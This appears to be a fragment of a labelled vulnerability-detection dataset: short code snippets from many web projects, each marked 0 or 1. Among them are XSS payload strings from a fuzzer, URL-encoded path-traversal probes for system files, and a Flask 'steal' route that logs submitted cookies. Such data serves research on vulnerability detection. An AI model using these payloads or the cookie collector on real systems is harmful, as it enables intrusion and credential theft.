DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder',", "label": 0}, {"snippet_id": 31222, "code": "\ttemplate=template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t \tprint(template) \t\t if form.getvalue('metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure", "label": 0}, {"snippet_id": 19414, "code": ".xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 38201, "code": " published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor", "label": 0}, {"snippet_id": 7127, "code": ".views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$',", "label": 0}, {"snippet_id": 48128, "code": " m.text=text m.cachedText=compile_markdown(text) m.category=category m.highResFile=\"/\" +high_res_file_name m.lowResFile=\"/\" +low_res_file_name m.headline=headline m.save() mu: MediaUpload=MediaUpload()", "label": 1}, {"snippet_id": 9845, "code": "), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 7193, "code": "=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'", "label": 0}, {"snippet_id": 21435, "code": "[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', ", "label": 0}, {"snippet_id": 42544, "code": "\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message", "label": 0}, {"snippet_id": 17909, "code": ".views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template':", "label": 0}, {"snippet_id": 28513, "code": "=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\".log\", \"a\"", "label": 0}, {"snippet_id": 5503, "code": " html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=", "label": 0}, {"snippet_id": 29311, "code": "\"] \t\telse: \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\"] \telse: \t\tif kwargs.get(\"just_save\")==\"test\": \t\t\tcommands=[ \"sudo haproxy -q -c", "label": 0}, {"snippet_id": 50470, "code": " self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called by render_POST when the client is signalling that", "label": 0}, {"snippet_id": 44198, "code": ".lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie", "label": 0}, {"snippet_id": 26364, "code": ". You can get the tax amount ' 'back via the VAT reimbursement process.')) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self", "label": 0}, {"snippet_id": 51040, "code": " def clean(self): print('cleaning') cleaned_data=super(PeriodicTaskForm, self).clean() return cleaned_data class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin): list_display=('name_safe", "label": 0}, {"snippet_id": 53183, "code": " params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted", "label": 0}, {"snippet_id": 50510, "code": ".sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in from the ajax", "label": 0}, {"snippet_id": 48728, "code": "'srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")", "label": 0}, {"snippet_id": 46652, "code": " request, *args, **kwargs): form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.render_to_response(self.get_context_data()) def get_form_kwargs(self, *args, **kwargs", "label": 0}, {"snippet_id": 50033, "code": "(self, obj): if isinstance(obj, Promise): return force_unicode(obj) return super(LazyEncoder, self).default(obj) def jsonify(obj): return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder))", "label": 0}, {"snippet_id": 48186, "code": " user: Profile=get_current_user(request) handle_file(user, headline, category, text, file) except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return redirect(\"/admin/media/add\") def", "label": 0}, {"snippet_id": 44881, "code": " uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps", "label": 0}, {"snippet_id": 256, "code": " import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger", "label": 0}, {"snippet_id": 18763, "code": "\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location", "label": 0}, {"snippet_id": 33926, "code": ") \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format", "label": 0}, {"snippet_id": 7069, "code": " name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student", "label": 0}, {"snippet_id": 30311, "code": "('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \ttry: \t\tresponse=requests.get('http://%s:%s/%s' %(serv, stats_port, stats_page), auth=(haproxy_user", "label": 0}, {"snippet_id": 18987, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log')", "label": 0}, {"snippet_id": 10481, "code": " 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth", "label": 0}, {"snippet_id": 21132, "code": "'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$", "label": 0}, {"snippet_id": 32202, "code": " import re import socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path.dirname(__file__)) SRC_DIR=os.path.dirname(os.path", "label": 0}, {"snippet_id": 34546, "code": ": \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn", "label": 0}, {"snippet_id": 3051, "code": "=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line", "label": 0}, {"snippet_id": 47861, "code": ".get(\"active\"): user.active=magic.parse_bool(request.POST[\"active\"]) au: User=user.authuser if check_password_conformity(pw1, pw2): logging.log(logging.INFO, \"Set password for user: \" +user.displayName)", "label": 0}, {"snippet_id": 21533, "code": ".get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade", "label": 0}, {"snippet_id": 24664, "code": ".xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then", "label": 0}, {"snippet_id": 42630, "code": " self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df", "label": 0}, {"snippet_id": 43211, "code": " and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t", "label": 0}, {"snippet_id": 52229, "code": "(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs", "label": 0}, {"snippet_id": 40439, "code": " precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield", "label": 0}, {"snippet_id": 49225, "code": ".replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): new_query.append(c) else: new_query.append('-{}'.format(c)) else: new_query.append(column) return self.get_url_with_query_params(", "label": 0}, {"snippet_id": 32913, "code": ": bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.'): continue", "label": 1}, {"snippet_id": 11842, "code": ".html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release", "label": 0}, {"snippet_id": 25558, "code": "\"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two additional keyword arguments: :param cartpos: The cart position the form should be for :param event: The event this belongs to \"\"\" cartpos=self.cartpos", "label": 0}, {"snippet_id": 16660, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name", "label": 0}, {"snippet_id": 19309, "code": " store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def", "label": 0}, {"snippet_id": 11629, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset", "label": 0}, {"snippet_id": 26886, "code": "\" +page print \"[+] XSS check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for xss in xss_attacks: post_params={} counter+=1 parameters", "label": 0}, {"snippet_id": 25771, "code": ", ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.Select, empty_label='', initial=initial", "label": 0}, {"snippet_id": 53291, "code": "=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %", "label": 0}, {"snippet_id": 50629, "code": " the Client browser session(used for auto-login based on browser session) Returns: csession(ClientSession): This is a django-specific internal representation of the browser session. \"\"\" if self.csessid", "label": 0}, {"snippet_id": 53600, "code": " bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]", "label": 0}, {"snippet_id": 35654, "code": " \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname", "label": 0}, {"snippet_id": 1290, "code": "'scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=", "label": 0}, {"snippet_id": 31320, "code": "\tmetrics[rep_date]['curr_ssl_con']=str(i[2]) \t\t\tmetrics[rep_date]['sess_rate']=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate']=str(i[4]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna", "label": 0}, {"snippet_id": 12830, "code": "-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid", "label": 0}, {"snippet_id": 19366, "code": ") name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite", "label": 0}, {"snippet_id": 17229, "code": "]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 35688, "code": "\t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname", "label": 0}, {"snippet_id": 35169, "code": "\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype", "label": 0}, {"snippet_id": 52875, "code": " retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow", "label": 0}, {"snippet_id": 26811, "code": " '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 44007, "code": " fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d,", "label": 0}, {"snippet_id": 39015, "code": "\t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not", "label": 0}, {"snippet_id": 17573, "code": ".urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=(''", "label": 0}, {"snippet_id": 41357, "code": " txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))", "label": 0}, {"snippet_id": 16678, "code": ")/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 1}, {"snippet_id": 29420, "code": " export config file</div>') \t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t\tbind=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind[0].strip(' ", "label": 0}, {"snippet_id": 10286, "code": " plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self", "label": 0}, {"snippet_id": 20195, "code": " from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store,", "label": 0}, {"snippet_id": 39223, "code": "\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k", "label": 0}, {"snippet_id": 15957, "code": "=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, )", "label": 0}, {"snippet_id": 42862, "code": " set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty')", "label": 0}, {"snippet_id": 26833, "code": "%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']", "label": 0}, {"snippet_id": 29733, "code": "\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set(", "label": 0}, {"snippet_id": 19531, "code": "\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"", "label": 0}, {"snippet_id": 30759, "code": "\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable, backend, serv, serv)) \t\t\t \tfunct.ssh_command(serv, command,", "label": 0}, {"snippet_id": 5975, "code": "() version='0.3.22' install_requires=[ 'pymongo>=2.8,<3', 'pysaml2==1.2.0beta5', 'python-memcached==1.53', 'cherrypy==3.2.4', 'vccs_client==0.4.1', 'eduid_am>=0.5.3', ] testing_extras=[ 'nose==1.2.1', ", "label": 1}, {"snippet_id": 25800, "code": "=forms.ModelMultipleChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.CheckboxSelectMultiple, initial=initial.options.all() if initial else None,", "label": 0}, {"snippet_id": 46216, "code": " else: return render('search.mako', request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines'", "label": 0}, {"snippet_id": 54759, "code": " \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name='articles' form_class=ArticleForm success_url='/' def get_context_data(self, **kwargs): context=super().get_context_data", "label": 0}, {"snippet_id": 5901, "code": "%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return ", "label": 0}, {"snippet_id": 28077, "code": ") class LogoutHandler(base_handler.Handler): \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"", "label": 0}, {"snippet_id": 21828, "code": "'ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views", "label": 0}, {"snippet_id": 29802, "code": " server in servers: \t\tif server !=\"\": \t\t\tprint(\"ok\") \t\t\tsys.exit() \tsys.exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U r hacker Oo?!\") \tsys.exit() \t\t if form.getvalue('getcerts') is", "label": 0}, {"snippet_id": 50138, "code": ".sessions_from_csessid(csessid) for sess in sessions: sess.disconnect() self.last_alive.pop(csessid, None) if not self.last_alive: self.keep_alive.stop() self.keep_alive=None def at_login(self): \"\"\" Called when this", "label": 0}, {"snippet_id": 22680, "code": ")$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url", "label": 0}, {"snippet_id": 13693, "code": "<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/", "label": 1}, {"snippet_id": 51417, "code": " timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path.dirname(__file__)) SECRET_KEY='_dzlo^9d DEBUG", "label": 0}, {"snippet_id": 18295, "code": ")/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter", "label": 1}, {"snippet_id": 35639, "code": ", label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self", "label": 0}, {"snippet_id": 5917, "code": "<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%", "label": 0}, {"snippet_id": 8870, "code": "==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view", "label": 0}, {"snippet_id": 25063, "code": " github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh(", "label": 0}, {"snippet_id": 34035, "code": " as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments", "label": 0}, {"snippet_id": 9280, "code": "/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position", "label": 0}, {"snippet_id": 27584, "code": " HTML response for 403.\"\"\" login_url=make_login_url(dest_url=self.request.url) user_email=helpers.get_user_email() if not user_email: self.redirect(login_url) return contact_string=db_config.get_value(", "label": 0}, {"snippet_id": 23777, "code": "() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 46511, "code": " existing_hue_collections: massaged_collection=collection.to_dict() if request.GET.get('is_mobile'): massaged_collection['absoluteUrl']=reverse('search:index_m') +'?collection=%s' % collection.id massaged_collection['isOwner'", "label": 0}, {"snippet_id": 1580, "code": "(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data", "label": 0}, {"snippet_id": 47923, "code": " not check_password_conformity(pw1, pw2): recreate_form('password mismatch') auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user.save() user: Profile=Profile()", "label": 1}, {"snippet_id": 11653, "code": "'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r", "label": 0}, {"snippet_id": 21341, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index", "label": 1}, {"snippet_id": 32033, "code": " django.utils.translation import ungettext_lazy from horizon import tables from openstack_dashboard import api class CreateMappingLink(tables.LinkAction): name=\"create\" verbose_name=_(\"Create Mapping\")", "label": 0}, {"snippet_id": 9638, "code": "[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 44002, "code": " False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t", "label": 0}, {"snippet_id": 48190, "code": " headline, category, text, file) except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return redirect(\"/admin/media/add\") def action_add_multiple_media(request: HttpRequest): try: category:", "label": 0}, {"snippet_id": 53866, "code": ",methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n-------", "label": 0}, {"snippet_id": 29442, "code": ".strip(' \\t\\n\\r') \t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind) \t\t\t\t \tfirewalld_commands.append('sudo firewall-cmd --reload') \treturn firewalld_commands", "label": 0}, {"snippet_id": 53405, "code": ".user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}", "label": 0}, {"snippet_id": 52750, "code": "(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param", "label": 0}, {"snippet_id": 34736, "code": "\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime", "label": 0}, {"snippet_id": 45090, "code": "(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators", "label": 0}, {"snippet_id": 21444, "code": "?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/", "label": 0}, {"snippet_id": 4817, "code": "=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\", "label": 0}, {"snippet_id": 41413, "code": ".blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, 